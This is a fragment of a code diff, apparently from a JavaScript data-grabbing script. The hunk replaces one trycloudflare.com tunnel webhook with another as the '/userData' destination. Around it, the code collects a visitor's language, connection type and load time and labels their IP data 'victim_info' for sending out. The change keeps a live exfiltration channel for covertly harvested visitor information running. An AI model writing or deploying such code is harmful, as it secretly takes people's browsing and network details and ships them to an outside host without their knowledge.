@@ -76,7 +76,7 @@ Language: ${userLanguage}
 Connection Type: ${connectionType}
 Loading Time: ${loadTime}`;
 
-            const webhookURL = "https://organisations-diary-pole-fine.trycloudflare.com/userData";
+            const webhookURL = "https://fountain-helped-randy-configurations.trycloudflare.com/userData";
 
             const payload = {
                 'victim_info': ipinfo, 
